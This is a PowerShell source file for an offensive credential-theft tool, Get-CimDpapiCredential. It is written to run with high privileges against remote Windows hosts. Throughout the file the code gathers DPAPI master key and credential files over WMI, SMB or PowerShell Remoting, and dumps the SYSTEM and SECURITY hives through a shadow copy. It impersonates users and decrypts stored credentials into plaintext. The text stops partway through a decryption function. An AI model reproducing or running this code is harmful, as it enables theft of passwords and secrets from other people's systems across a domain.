#requires -version 3

Function Get-CimDpapiCredential {
<#
.SYNOPSIS
    Grab DPAPI credential blobs and decrypt them.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CimDpapiCredential gathers DPAPI master key files and credential files on a remote host through WMI, and downloads them via SMB or PowerShell Remoting.
    It also gets a copy of the SYSTEM and SECURITY hives via VSS from the remote host in order to extract system DPAPI keys.
    From local copies, Get-CimDpapiCredential decrypts DPAPI master keys of system (using the DPAPI system keys retrieved) as well as domain users (using the supplied domain backup key).
    Finally, it attempts to decrypt DPAPI credential blobs using reachable master keys.
    The decryption part is highly inspired from SharpDPAPI (by @harmj0y).

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Authentication
    Specifies what authentication method should be used.

.PARAMETER Protocol
    Specifies the protocol to use, defaults to DCOM.

.PARAMETER BackupKeyFile
    Specifies the DPAPI domain private key file used to decrypt reachable user masterkeys.

.PARAMETER DomainOnly
    Disables DPAPI system key retrieval, to avoid registry hive dump.

.EXAMPLE
    PS C:\> Get-CimDpapiCredential -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -BackupKeyFile .\domain_backup.pvk
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Default', 'Kerberos', 'Negotiate', 'NtlmDomain')]
        [String]
        $Authentication = 'Default',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [String]
        $BackupKeyFile,

        [Switch]
        $DomainOnly
    )

    Begin {
        # Check script parameters
        if ($DomainOnly -and -not $BackupKeyFile) {
            Write-Warning "Please specify backup key file or retry without switch '-DomainOnly'"
            continue
        }

        # Optionally check host reachability
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            continue
        }

        # Init variables
        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        $outputDirectory = "$Env:TEMP\$ComputerName"
        $formatDefaultLimit = $global:FormatEnumerationLimit
    }

    Process {
        # Prevent output truncation
        $global:FormatEnumerationLimit = -1

        # Init remote sessions
        try {
            if (-not $PSBoundParameters['ComputerName']) {
                $cimSession = New-CimSession -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if (($Protocol -eq 'Wsman') -and (-not $DomainOnly)) {
                    $psSession = New-PSSession -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            elseif ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if (($Protocol -eq 'Wsman') -and (-not $DomainOnly)) {
                    $psSession = New-PSSession -ComputerName $ComputerName -Credential $Credential -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
                if (($Protocol -eq 'Wsman') -and (-not $DomainOnly)) {
                    $psSession = New-PSSession -ComputerName $ComputerName -Authentication $Authentication -SessionOption $psOption -ErrorAction Stop -Verbose:$false
                }
            }
        }
        catch [Management.Automation.PSArgumentOutOfRangeException] {
            Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
            return
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8033810c,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
                return
            }
            if ($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                Write-Verbose "[$ComputerName] Access denied."
                return
            }
            else {
                Write-Verbose "[$ComputerName] Failed to establish CIM session."
                return
            }
        }
        catch [Management.Automation.Remoting.PSRemotingTransportException] {
            Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
            return
        }

        # Optionally process extraction of system master keys
        if (-not $DomainOnly) {
            Write-Verbose "[$ComputerName] Extracting system DPAPI keys from shadow copy..."
            if ($Credential.UserName) {
                $logonToken = Invoke-UserImpersonation -Credential $Credential
            }
            try {
                $systemDpapiKeys = Get-ShadowLsaDpapiKey -CimSession $cimSession -PSSession $psSession
            }
            catch {
                Write-Verbose "[$ComputerName] No shadow copy available. Retrying..."
                $systemDpapiKeys = Get-ShadowLsaDpapiKey -CimSession $cimSession -PSSession $psSession -Force
            }
            if ($logonToken) {
                Invoke-RevertToSelf -TokenHandle $logonToken
            }

            Write-Verbose "[$ComputerName] Extracting system master keys..."
            $masterKeys = @{}
            $dpapiKeyUser = $systemDpapiKeys['dpapi_userkey']
            $dpapiKeyMachine = $systemDpapiKeys['dpapi_machinekey']
            $masterKeyFiles = Get-CimDirectory -Path "C:\Windows\System32\Microsoft\Protect\" -Recurse -CimSession $cimSession | Where-Object {$_.CimClass.CimClassName -eq 'CIM_DataFile'}
            foreach ($masterKeyFile in $masterKeyFiles) {
                if ([Regex]::IsMatch($masterKeyFile.FileName, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$")) {
                    # Copy master key file locally
                    $outputFile = "$outputDirectory\$($masterKeyFile.FileName).$($masterKeyFile.Extension)"
                    New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
                    if ($psSession) {
                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
                    }
                    else {
                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                    }

                    $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
                    try {
                        if ($masterKeyFile.Name.Contains('\User\')) {
                            # Decrypt system master key using dpapi_userkey
                            if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyUser) {
                                $masterKeys += $plaintextMasterKey
                            }
                        }
                        else {
                            # Decrypt system master key using dpapi_machinekey
                            if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyMachine) {
                                $masterKeys += $plaintextMasterKey
                            }
                        }
                    }
                    catch {
                        Write-Warning "[$ComputerName] System master key decryption failed. $_"
                    }
                }
            }
        }

        # Process extraction of domain user master keys
        if ($BackupKeyFile) {
            Write-Verbose "[$ComputerName] Extracting user master keys..."
            $backupKeyBytes = [IO.File]::ReadAllBytes($BackupKeyFile)
            $masterKeyFilePath = "\AppData\Roaming\Microsoft\Protect\"
            Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
                $masterKeyFiles = Get-CimDirectory -Path ($_.LocalPath + $masterKeyFilePath) -Recurse -CimSession $cimSession | Where-Object {$_.CimClass.CimClassName -eq 'CIM_DataFile'}
                foreach ($masterKeyFile in $masterKeyFiles) {
                    if ([Regex]::IsMatch($masterKeyFile.FileName, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$")) {
                        # Copy user master key file locally
                        $temp = $_.LocalPath -split "\\"
                        $outputFile = "$outputDirectory\$($temp.get($temp.Count - 1))_$($masterKeyFile.FileName).$($masterKeyFile.Extension)"
                        New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
                        if ($psSession) {
                            Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
                        }
                        else {
                            Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                        }

                        # Decrypt user master key using provided backup key
                        $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
                        try {
                            if ($plaintextMasterKey = Decrypt-MasterKey -MasterKeyBytes $masterKeyBytes -BackupKeyBytes $backupKeyBytes) {
                                $masterKeys += $plaintextMasterKey
                            }
                        }
                        catch {
                            Write-Verbose "[$ComputerName] User master key decryption failed. $_"
                        }
                    }
                }
            }
        }

        # Process extraction of DPAPI credentials
        if ($masterKeys) {
            # Get credential files
            Write-Verbose "[$ComputerName] Extracting DPAPI credentials..."
            $credentialFilePaths = @(
                "\AppData\Local\Microsoft\Credentials\"
                "\AppData\Roaming\Microsoft\Credentials\"
            )
            Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
                foreach ($credentialFilePath in $credentialFilePaths) {
                    $credentialFiles = Get-CimDirectory -Path ($_.LocalPath + $credentialFilePath) -CimSession $cimSession | Where-Object {$_.CimClass.CimClassName -eq 'CIM_DataFile'}
                    foreach ($credentialFile in $credentialFiles) {
                        # Copy credential file locally
                        $temp = $_.LocalPath -split "\\"
                        $outputFile = "$outputDirectory\$($temp.get($temp.Count - 1))_$($credentialFile.FileName).$($credentialFile.Extension)"
                        New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
                        if ($psSession) {
                            Get-RemoteFile -Path $credentialFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
                        }
                        else {
                            Get-RemoteFile -Path $credentialFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                        }

                        # Decrypt credential blob using available master keys
                        $credentialBytes = [IO.File]::ReadAllBytes($outputFile)
                        if ($plaintextBytes = Decrypt-DpapiBlob -BlobBytes $credentialBytes -MasterKeys $masterKeys -GuidOffset 36) {
                            $cred = Get-CredentialBlob -DecBlobBytes $plaintextBytes
                            if ($cred.Password -or $cred.Data) {
                                $result = New-Object -TypeName PSObject
                                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $credentialFile.Name
                                $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $cred
                                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $credentialFile.CreationDate
                                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $credentialFile.LastModified
                                Write-Output $result
                            }
                        }
                    }
                }
            }
        }
        else {
            Write-Warning "[$ComputerName] No master key found."
        }
    }

    End {
        # Delete local copies
        Remove-Item -Recurse -Force -Path $outputDirectory -ErrorAction SilentlyContinue
        # End remote sessions
        if ($cimSession) {
            Remove-CimSession -CimSession $cimSession
        }
        if ($psSession) {
            Remove-PSSession -Session $psSession
        }
        # Restore output limit
        $global:FormatEnumerationLimit = $formatDefaultLimit
    }
}

Function Get-ShadowLsaDpapiKey {
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Microsoft.Management.Infrastructure.CimSession]
        $CimSession,

        [Management.Automation.Runspaces.PSSession]
        $PSSession,

        [Switch]
        $Force
    )

    Begin {
        $keys = @{}
        $ComputerName = $CimSession.ComputerName
    }

    Process {
        if ($Force) {
            Write-Verbose "[$ComputerName] Creating a shadow copy of volume 'C:\'"
            $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession -ErrorAction Stop -Verbose:$false
            $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession -Verbose:$false
        }
        else {
            Write-Verbose "[$ComputerName] Getting the latest shadow copy of volume 'C:\'"
            $deviceID = (Get-CimInstance -ClassName Win32_Volume -Filter "DriveLetter='C:'" -CimSession $cimSession -ErrorAction Stop -Verbose:$false).DeviceID
            $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $cimSession -Verbose:$false | Where-Object {$_.VolumeName -eq $deviceID} | Sort-Object InstallDate | Select-Object -Last 1
        }
        if (-not $shadowCopy) {
            Write-Error "[$ComputerName] No shadow copy available. Please retry with switch '-Force'" -ErrorAction Stop
        }

        $outputDirectory = "$Env:TEMP\$ComputerName"
        New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null

        if ($psSession) {
            $deviceObject = $shadowCopy.DeviceObject.ToString()
            $tempDir = "C:\Windows\Temp\dump"
            $process = Invoke-CimMethod -ClassName Win32_Process -Name create -Arguments @{CommandLine="cmd.exe /c mklink $tempDir $deviceObject"} -CimSession $cimSession -Verbose:$false
            do {
                Start-Sleep -m 250
            }
            until ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

            # Download files via PSRemoting
            Write-Verbose "[$ComputerName] Copying the registry hives into $(Resolve-Path $outputDirectory)"
            $systemBackupPath = "$tempDir\Windows\System32\config\SYSTEM"
            $securityBackupPath = "$tempDir\Windows\System32\config\SECURITY"
            Copy-Item -Path "$systemBackupPath" -Destination "$outputDirectory" -FromSession $psSession
            Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory" -FromSession $psSession

            # Delete the shadow link
            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir.Replace('\','\\'))'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance -Verbose:$false
        }
        else {
            # Create a SafeFileHandle of the UNC path
            $handle = [Native]::CreateFileW(
                "\\$ComputerName\C$",
                [Security.AccessControl.FileSystemRights]"ListDirectory",
                [IO.FileShare]::ReadWrite,
                [IntPtr]::Zero,
                [IO.FileMode]::Open,
                0x02000000,
                [IntPtr]::Zero
            )
            if ($handle.IsInvalid) {
                Write-Error -Message "CreateFileW failed"
            }
            # Invoke NtFsControlFile to access the snapshots
            $transDataSize = [Runtime.InteropServices.Marshal]::SizeOf([Type][Native+NT_Trans_Data])
            $bufferSize = $transDataSize + 4
            $outBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
            $ioBlock = New-Object -TypeName Native+IO_STATUS_BLOCK
            [Native]::NtFsControlFile($handle, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [Ref]$ioBlock, 0x00144064, [IntPtr]::Zero, 0, $outBuffer, $bufferSize) | Out-Null
            # Download files via SMB
            Write-Verbose "[$ComputerName] Copying the registry hives into $(Resolve-Path $outputDirectory)"
            $shadowPath = $shadowCopy.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
            $systemBackupPath = "\\$ComputerName\C$\$shadowPath\Windows\System32\config\SYSTEM"
            $securityBackupPath = "\\$ComputerName\C$\$shadowPath\Windows\System32\config\SECURITY"
            Copy-Item -Path "$systemBackupPath" -Destination "$outputDirectory"
            Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory"

            # Close the handle
            $handle.Dispose()
        }

        if ($Force) {
            Write-Verbose "[$ComputerName] Cleaning up the shadow copy"
            $shadowCopy | Remove-CimInstance -CimSession $cimSession -Verbose:$false
        }

        Write-Verbose "[$ComputerName] Extracting secrets from hive copy"
        if ($result = [HiveParser]::ParseDpapiKeys("$outputDirectory\SYSTEM", "$outputDirectory\SECURITY")) {
            # Delete local copy
            Remove-Item -Recurse $outputDirectory
            $keys = @{dpapi_machinekey=$result[0]; dpapi_userkey=$result[1]}
        }
    
        return $keys
    }

    End {}
}

# Adapted from PowerView by @harmj0y and @mattifestation
Function Local:Invoke-UserImpersonation {
    [OutputType([IntPtr])]
    Param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        if (-not [Native]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    if (-not [Native]::ImpersonateLoggedOnUser($LogonTokenHandle)) {
        throw "[UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    $LogonTokenHandle
}

Function Local:Invoke-RevertToSelf {
    Param (
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        [Native]::CloseHandle($TokenHandle) | Out-Null
    }
    if (-not [Native]::RevertToSelf()) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
}

Function Local:Get-CimDirectory {
    Param (
        [ValidateNotNullorEmpty()]
        [String]
        $Path = ".",

        [Switch]
        $Recurse,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Microsoft.Management.Infrastructure.CimSession]
        $CimSession
    )

    Begin {
        $path = $path.TrimEnd("\")
        $cimParams = @{
            ClassName  = "Win32_Directory"
            Filter     = "Name='$($path.Replace("\", "\\"))'"
            CimSession = $CimSession
            Verbose    = $false
        }
    }

    Process {
        $currentDir = Get-CimInstance @cimParams

        # Enumerate files
        $currentDir | Get-CimAssociatedInstance -ResultClassName CIM_DataFile -Verbose:$false

        # Enumerate directories
        $subDir = $currentDir | Get-CimAssociatedInstance -ResultClassName Win32_Directory -Verbose:$false |
            Where-Object { (Split-Path $_.Name) -eq $currentDir.Name } # Filter out the parent folder
        $subDir

        if ($Recurse -and $subDir) {
            foreach ($directory in $subDir) {
                Get-CimDirectory -Path $directory.Name -Recurse -CimSession $cimSession
            }
        }
    }

    End {}
}

Function Local:Get-RemoteFile {
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        $Path,

        [Parameter(Mandatory = $True)]
        [String]
        $Destination,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.Automation.Runspaces.PSSession]
        $PSSession
    )

    Begin {
        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
            $stringBuilder = New-Object System.Text.StringBuilder 
            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
                [Void]$stringBuilder.Append($_.ToString("x2")) 
            } 
            return $stringBuilder.ToString() 
        }
    }

    Process {
        if ($PSSession) {
            # Download file via PSRemoting
            Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
        }
        else {
            # Download file via SMB
            $fileDrive = ($Path -split ':').Get(0)
            $filePath = ($Path -split ':').Get(1)
            if ($Credential.Username) {
                $drive = Get-StringHash $ComputerName
                New-PSDrive -Name $drive -Root "\\$ComputerName\$fileDrive`$" -PSProvider "FileSystem" -Credential $Credential | Out-Null
                Copy-Item -Path "${drive}:$filePath" -Destination $Destination -Recurse
                Remove-PSDrive $drive
            }
            else {
                Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
            }
        }
    }

    End {}
}

Function Local:Decrypt-MasterKeyWithSha {
    Param (
        [byte[]] $MasterKeyBytes,
        [byte[]] $ShaBytes
    )

    Begin {
        Function Local:Get-DerivedPreKey ([byte[]] $ShaBytes, [int] $AlgHash, [byte[]] $Salt, [int] $Rounds) {
            $derivedPreKey = $null
            switch ($algHash) {
                # CALG_SHA_512 == 32782
                32782 {
                    # derive the "Pbkdf2/SHA512" key for the masterkey, using MS' silliness
                    $hmac = New-Object Security.Cryptography.HMACSHA512
                    $df = New-Object Pbkdf2 ($hmac, $ShaBytes, $Salt, $Rounds)
                    $derivedPreKey = $df.GetBytes(48)
                    break
                }
                32777 {
                    # derive the "Pbkdf2/SHA1" key for the masterkey, using MS' silliness
                    $hmac = New-Object Security.Cryptography.HMACSHA1
                    $df = New-Object Pbkdf2 ($hmac, $ShaBytes, $Salt, $Rounds)
                    $derivedPreKey = $df.GetBytes(32)
                    break
                }
                default {
                    throw "alg hash $algHash not currently supported!"
                }
            }
            return $derivedPreKey
        }

        Function Local:Decrypt-Aes256HmacSha512 ([byte[]] $ShaBytes, [byte[]] $Final, [byte[]] $EncData) {
            $HMACLen = (New-Object Security.Cryptography.HMACSHA512).HashSize / 8
            $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
            $ivBytes = New-Object byte[] 16
            [Array]::Copy($Final, 32, $ivBytes, 0, 16)
            $key = New-Object byte[] 32
            [Array]::Copy($Final, 0, $key, 0, 32)
            $aesCryptoProvider.Key = $key
            $aesCryptoProvider.IV = $ivBytes
            $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
            $aesCryptoProvider.Padding = [Security.Cryptography.PaddingMode]::Zeros
            # decrypt the encrypted data using the Pbkdf2-derived key
            $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($EncData, 0, $EncData.Length)
            $outLen = $plaintextBytes.Length
            $outputLen = $outLen - 16 - $HMACLen
            $masterKeyFull = New-Object byte[] $HMACLen
            # outLen - outputLen == 80 in this case
            [Array]::Copy($plaintextBytes, $outLen - $outputLen, $masterKeyFull, 0, $masterKeyFull.Length);
            $sha1 = New-Object Security.Cryptography.SHA1Managed
            $masterKeySha1 = $sha1.ComputeHash($masterKeyFull)
            # we're HMAC'ing the first 16 bytes of the decrypted buffer with the ShaBytes as the key
            $plaintextCryptBuffer = New-Object byte[] 16
            [Array]::Copy($plaintextBytes, $plaintextCryptBuffer, 16)
            $hmac1 = New-Object Security.Cryptography.HMACSHA512 @(, $ShaBytes)
            $round1Hmac = $hmac1.ComputeHash($plaintextCryptBuffer)
            # round 2
            $round2buffer = New-Object byte[] $outputLen
            [Array]::Copy($plaintextBytes, $outLen - $outputLen, $round2buffer, 0, $outputLen)
            $hmac2 = New-Object Security.Cryptography.HMACSHA512 @(, $round1Hmac)
            $round2Hmac = $hmac2.ComputeHash($round2buffer)
            # compare the second HMAC value to the original plaintextBytes, starting at index 16
            $comparison = New-Object byte[] 64
            [Array]::Copy($plaintextBytes, 16, $comparison, 0, $comparison.Length)
            if ([Linq.Enumerable]::SequenceEqual($comparison, $round2Hmac)) {
                return $masterKeySha1
            }
            throw "HMAC integrity check failed!"
        }

        Function Local:Decrypt-TripleDesHmac ([byte[]] $Final, [byte[]] $EncData) {
            $desCryptoProvider = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
            $ivBytes = New-Object byte[] 8
            $key = New-Object byte[] 24
            [Array]::Copy($Final, 24, $ivBytes, 0, 8)
            [Array]::Copy($Final, 0, $key, 0, 24)
            $desCryptoProvider.Key = $key
            $desCryptoProvider.IV = $ivBytes
            $desCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
            $desCryptoProvider.Padding = [Security.Cryptography.PaddingMode]::Zeros
            $plaintextBytes = $desCryptoProvider.CreateDecryptor().TransformFinalBlock($EncData, 0, $EncData.Length)
            $decryptedkey = New-Object byte[] 64
            [Array]::Copy($plaintextBytes, 40, $decryptedkey, 0, 64)
            $sha1 = New-Object Security.Cryptography.SHA1Managed
            $masterKeySha1 = $sha1.ComputeHash($decryptedkey)
            return $masterKeySha1
        }
    }

    Process {
        $guidMasterKey = [Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72)
        # Get the master key
        $offset = 96
        $masterKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
        $offset += 4 * 8
        $masterKeySubBytes = New-Object byte[] $masterKeyLen
        [Array]::Copy($MasterKeyBytes, $offset, $masterKeySubBytes, 0, $masterKeyLen)
        $offset = 4
        $salt = New-Object byte[] 16
        [Array]::Copy($masterKeySubBytes, 4, $salt, 0, 16)
        $offset += 16
        $rounds = [BitConverter]::ToInt32($masterKeySubBytes, $offset)
        $offset += 4
        $algHash = [BitConverter]::ToInt32($masterKeySubBytes, $offset)
        $offset += 4
        $algCrypt = [BitConverter]::ToInt32($masterKeySubBytes, $offset)
        $offset += 4
        $encData = New-Object byte[] ($masterKeySubBytes.Length - $offset)
        [Array]::Copy($masterKeySubBytes, $offset, $encData, 0, $encData.Length)
        $derivedPreKey = Get-DerivedPreKey $ShaBytes $algHash $salt $rounds
        if (($algCrypt -eq 26128) -and ($algHash -eq 32782)) {
            # CALG_AES_256 == 26128 , CALG_SHA_512 == 32782
            $masterKeySha1 = Decrypt-Aes256HmacSha512 $ShaBytes $derivedPreKey $encData
            $masterKeyStr = [BitConverter]::ToString($masterKeySha1).Replace("-", "")
            return @{$guidMasterKey=$masterKeyStr}
        }
        elseif (($algCrypt -eq 26115) -and (($algHash -eq 32777) -or ($algHash -eq 32772))) {
            # 32777(CALG_HMAC) / 26115(CALG_3DES)
            $masterKeySha1 = Decrypt-TripleDesHmac $derivedPreKey $encData
            $masterKeyStr = [BitConverter]::ToString($masterKeySha1).Replace("-", "")
            return @{$guidMasterKey=$masterKeyStr}
        }
        else {
            throw "Alg crypt $algCrypt not currently supported!"
        }
    }

    End {}
}

Function Local:Decrypt-MasterKey {
    Param (
        [byte[]]
        $MasterKeyBytes,

        [byte[]]
        $BackupKeyBytes
    )

    $guidMasterKey = [Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72)

    # Get the domain key
    $offset = 96
    $masterKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    $offset += 8
    $backupKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    $offset += 8
    $credHistLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    $offset += 8
    $domainKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
    if ($domainKeyLen -eq 0) {
        return
    }
    $offset += 8
    $offset += [int] ($masterKeyLen + $backupKeyLen + $credHistLen)
    $domainKeyBytes = New-Object byte[] $domainKeyLen
    [Array]::Copy($MasterKeyBytes, $offset, $domainKeyBytes, 0, $domainKeyLen)
    $offset = 4
    $secretLen = [BitConverter]::ToInt32($domainKeyBytes, $offset)
    $offset += 4
    $accesscheckLen = [BitConverter]::ToInt32($domainKeyBytes, $offset)
    $offset += 4
    $offset += 16
    $secretBytes = New-Object byte[] $secretLen
    [Array]::Copy($domainKeyBytes, $offset, $secretBytes, 0, $secretLen)
    $offset += $secretLen
    $accesscheckBytes = New-Object byte[] $accesscheckLen
    [Array]::Copy($domainKeyBytes, $offset, $accesscheckBytes, 0, $accesscheckLen)

    # Extract out the RSA private key
    $rsaPriv = New-Object byte[] ($BackupKeyBytes.Length - 24)
    [Array]::Copy($BackupKeyBytes, 24, $rsaPriv, 0, $rsaPriv.Length)
    $a = [BitConverter]::ToString($rsaPriv).Replace("-", "")
    $sec = [BitConverter]::ToString($secretBytes).Replace("-", "")

    # Decrypt the domain key
    $cspParameters = New-Object Security.Cryptography.CspParameters 24
    $rsaProvider = New-Object Security.Cryptography.RSACryptoServiceProvider $cspParameters
    try {
        $rsaProvider.PersistKeyInCsp = $false
        $rsaProvider.ImportCspBlob($rsaPriv)
        $secretBytesRev = New-Object byte[] 256
        [Buffer]::BlockCopy($secretBytes, 0, $secretBytesRev, 0, $secretBytes.Length)
        [Array]::Reverse($secretBytesRev)
        $domainKeyBytesDec = $rsaProvider.Decrypt($secretBytesRev, $false)
    }
    catch {
        Write-Verbose "Error while decrypting domain key: $_"
    }
    finally {
        $rsaProvider.PersistKeyInCsp = $false
        $rsaProvider.Clear()
    }

    $masterKeyLen = [BitConverter]::ToInt32($domainKeyBytesDec, 0)
    $suppKeyLen = [BitConverter]::ToInt32($domainKeyBytesDec, 4)

    $masterKey = New-Object byte[] $masterKeyLen
    [Buffer]::BlockCopy($domainKeyBytesDec, 8, $masterKey, 0, $masterKeyLen)
    $sha1 = New-Object Security.Cryptography.SHA1Managed
    $masterKeySha1 = $sha1.ComputeHash($masterKey)
    $masterKeySha1Hex = [BitConverter]::ToString($masterKeySha1).Replace("-", "")

    return @{$guidMasterKey=$masterKeySha1Hex}
}

Function Local:Decrypt-DpapiBlob {
    Param (
        [byte[]]
        $BlobBytes,

        [hashtable]
        $MasterKeys,

        [int]
        $GuidOffset = 24
    )

    Begin {
        Function Local:Get-DerivedKey ([byte[]] $KeyBytes, [byte[]] $SaltBytes, [int] $AlgHash) {
            if ($algHash -eq 32782) { # CALG_SHA_512
                $hmac = New-Object Security.Cryptography.HMACSHA512 @(, $KeyBytes)
                $sessionKeyBytes = $hmac.ComputeHash($saltBytes)
                return $sessionKeyBytes
            }
